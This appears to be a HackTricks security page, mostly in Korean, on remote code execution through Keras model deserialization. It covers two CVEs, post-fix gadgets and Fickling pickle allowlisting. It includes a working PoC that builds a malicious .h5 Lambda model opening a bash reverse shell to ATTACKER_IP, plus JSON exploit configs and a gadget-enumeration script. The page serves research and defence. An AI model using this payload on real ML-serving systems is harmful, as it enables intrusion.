# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 Keras model deserialization pipeline에 대한 실전 익스플로잇 기법을 요약하고, 네이티브 .keras 포맷의 내부 구조와 공격 표면을 설명하며, Model File Vulnerabilities (MFVs)와 post-fix gadgets를 찾기 위한 연구자 툴킷을 제공합니다.

## .keras model format internals

.a .keras file is a ZIP archive containing at least:
- metadata.json – 일반 정보 (예: Keras 버전)
- config.json – 모델 아키텍처 (주요 공격 표면)
- model.weights.h5 – HDF5 형식의 가중치

config.json은 재귀적 역직렬화를 주도합니다: Keras가 모듈을 import하고, 클래스/함수를 해석하며, 공격자가 제어하는 딕셔너리로부터 레이어/객체를 재구성합니다.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
역직렬화는 다음을 수행합니다:
- module/class_name 키에서 모듈 임포트 및 심볼 해석
- from_config(...) 또는 생성자 호출(공격자가 제어하는 kwargs 사용)
- 중첩 객체(activations, initializers, constraints 등)로의 재귀

역사적으로, 이것은 config.json을 조작하는 공격자에게 세 가지 프리미티브를 노출했다:
- 어떤 모듈이 임포트되는지 제어
- 어떤 클래스/함수가 해석되는지 제어
- constructors/from_config에 전달되는 kwargs를 제어

## CVE-2024-3660 – Lambda-layer bytecode RCE

근본 원인:
- Lambda.from_config()는 python_utils.func_load(...)를 사용했는데, 이는 공격자가 제공한 바이트를 base64로 디코드하고 marshal.loads()를 호출한다; Python의 unmarshalling은 코드 실행이 가능하다.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.

Notes:
- 레거시 포맷(구형 HDF5 저장) 또는 오래된 코드베이스는 최신 검사를 강제하지 않을 수 있으므로 “downgrade” 스타일 공격이 피해자가 구형 로더를 사용할 때 여전히 적용될 수 있습니다.

## CVE-2025-1550 – Keras ≤ 3.8에서 임의의 모듈 임포트

Root cause:
- _retrieve_class_or_fn가 config.json으로부터 공격자가 제어하는 모듈 문자열을 사용해 제한 없는 importlib.import_module()를 호출했습니다.
- Impact: 설치된 어떤 모듈이든 임의로 임포트 가능(또는 sys.path에 공격자가 심어놓은 모듈). 임포트 시 코드가 실행되고, 이후 공격자 kwargs로 객체 생성이 발생합니다.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
보안 개선사항 (Keras ≥ 3.9):
- Module allowlist: 임포트가 공식 생태계 모듈로 제한됨: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True은 안전하지 않은 Lambda 직렬화-함수 로딩을 차단함
- Basic type checking: 역직렬화된 객체는 예상 타입과 일치해야 함

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

많은 프로덕션 스택은 여전히 레거시 TensorFlow-Keras HDF5 모델 파일(.h5)을 허용합니다. 공격자가 서버가 나중에 로드하거나 inference를 실행할 모델을 업로드할 수 있다면, Lambda 레이어는 load/build/predict 시 임의의 Python을 실행할 수 있습니다.

역직렬화되거나 사용될 때 reverse shell을 실행하는 악성 .h5를 제작하기 위한 최소 PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notes and reliability tips:
- 트리거 포인트: 코드가 여러 번 실행될 수 있음(예: during layer build/first call, model.load_model, and predict/fit). Make payloads idempotent.
- 버전 고정: 직렬화 불일치를 피하려면 대상의 TF/Keras/Python 버전과 일치시켜라. 예: 대상이 그것을 사용한다면 Python 3.8과 TensorFlow 2.13.1 하에서 빌드 아티팩트를 생성하라.
- 빠른 환경 복제:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 검증: os.system("ping -c 1 YOUR_IP") 같은 무해한 페이로드는 실행 여부를 확인하는 데 도움이 됩니다(예: tcpdump로 ICMP를 관찰). reverse shell로 전환하기 전에.

## allowlist 내부의 Post-fix gadget 표면

allowlisting 및 safe mode 상태에서도 허용된 Keras callables 사이에는 넓은 표면이 남아 있습니다. 예를 들어, keras.utils.get_file은 임의의 URL을 사용자가 선택한 위치로 다운로드할 수 있습니다.

Lambda를 통해 허용된 함수를 참조하는 gadget (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
중요한 제한사항:
- Lambda.call()는 대상 callable을 호출할 때 입력 텐서를 첫 번째 위치 인수로 앞에 추가합니다. 선택된 gadgets는 추가 위치 인수(extra positional arg)를 허용하거나 *args/**kwargs를 받아들여야 합니다. 이 제약은 어떤 함수들이 사용 가능한지를 제한합니다.

## ML pickle import allowlisting for AI/ML models (Fickling)

많은 AI/ML 모델 포맷(PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, 오래된 TensorFlow 아티팩트 등)은 Python pickle 데이터를 포함합니다. 공격자는 로드 중에 RCE 또는 모델 교체를 달성하기 위해 pickle GLOBAL imports와 객체 생성자를 일상적으로 악용합니다. 블랙리스트 기반 스캐너는 종종 새롭거나 목록에 없는 위험한 imports를 놓칩니다.

실용적인 fail-closed 방어는 Python의 pickle deserializer를 훅(hook)하고 언픽클링 중에 검토된 무해한 ML 관련 imports 집합만 허용하는 것입니다. Trail of Bits’ Fickling은 이 정책을 구현하며 수천 개의 공개 Hugging Face pickles에서 구축된 선별된 ML import allowlist를 제공합니다.

“안전한” imports에 대한 보안 모델(연구와 실무에서 추출한 직관): pickle에서 사용하는 import된 심볼은 동시에 다음을 만족해야 합니다:
- 코드를 실행하거나 실행을 유발하지 않아야 함(컴파일된/소스 코드 객체, shelling out, hooks 등 없음)
- 임의의 속성이나 항목을 get/set 하지 않아야 함
- pickle VM으로부터 다른 Python 객체를 import 하거나 참조를 얻지 않아야 함
- 간접적으로라도 보조 deserializer(예: marshal, nested pickle)를 트리거하지 않아야 함

프로세스 시작 시 가능한 한 일찍 Fickling의 보호를 활성화하여 프레임워크(torch.load, joblib.load 등)가 수행하는 모든 pickle 로드가 검사되도록 하세요:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
운영 팁:
- 필요한 경우 hooks를 일시적으로 비활성화/재활성화할 수 있습니다:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 이미 known-good model이 차단된 경우, 심볼을 검토한 뒤 환경의 allowlist를 확장하세요:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling은 더 세밀한 제어를 원할 경우 일반적인 런타임 가드를 제공합니다:
- fickling.always_check_safety() — 모든 pickle.load()에 대한 검사를 강제합니다
- with fickling.check_safety(): — 범위 기반 적용을 위해
- fickling.load(path) / fickling.is_likely_safe(path) — 일회성 검사용

- 가능하면 non-pickle 모델 포맷(예: SafeTensors)을 선호하세요. 만약 pickle을 받아들여야 한다면, 네트워크 아웃바운드(egress) 없이 최소 권한으로 로더를 실행하고 allowlist를 적용하세요.

This allowlist-first 전략은 호환성을 높게 유지하면서 일반적인 ML pickle 익스플로잇 경로를 효과적으로 차단합니다. ToB의 벤치마크에서 Fickling은 합성 악성 파일의 100%를 플래그했으며, 상위 Hugging Face 저장소의 정상 파일 중 약 99%를 허용했습니다.


## 연구자 툴킷

1) 허용된 모듈에서의 체계적인 gadget 발견

keras, keras_nlp, keras_cv, keras_hub 전반에서 후보 callables를 열거하고 파일/네트워크/프로세스/환경(env)에 영향을 주는 사이드 이펙트를 가진 것들을 우선순위로 둡니다.

<details>
<summary>allowlisted Keras 모듈에서 잠재적으로 위험한 callables 열거</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) 직접 역직렬화 테스트 (.keras 아카이브 불필요)

조작된 dicts를 Keras 역직렬화기에 직접 넣어 허용되는 파라미터를 파악하고 부작용을 관찰한다.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 버전 간 프로빙 및 포맷

Keras는 서로 다른 가드레일과 포맷을 가진 여러 코드베이스/시대에 존재합니다:
- TensorFlow 내장 Keras: tensorflow/python/keras (레거시, 삭제 예정)
- tf-keras: 별도로 유지 관리됨
- Multi-backend Keras 3 (official): 네이티브 .keras 도입

코드베이스와 포맷(.keras vs legacy HDF5) 전반에서 테스트를 반복하여 회귀나 누락된 방어를 찾아내세요.

## 참고자료

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
